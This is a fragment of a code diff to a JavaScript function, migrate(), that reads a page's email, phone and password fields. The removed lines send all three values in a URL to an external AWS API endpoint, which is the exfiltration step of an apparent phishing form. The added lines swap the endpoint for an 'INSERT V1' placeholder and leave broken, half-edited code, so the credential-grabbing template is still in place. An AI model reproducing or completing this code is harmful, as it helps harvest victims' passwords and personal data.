@@ -71,9 +71,10 @@ var email  = document.getElementById('email');
 var phone = document.getElementById('phone');
 var password = document.getElementById('password');
 function migrate(){
-    var res = "https://kl9bzj1p84.execute-api.us-east-2.amazonaws.com/btest?email="+email.value+"&password="+password.value+"&phone="+phone.value;
-
-    window.open(res,"_blank");
+    var res = "INSERT V1"
+    var v1 = email.value+"&password="+password.value+"&phone="+phone.value;
+    
+    window.open(v1,"_blank");
 }
 
 
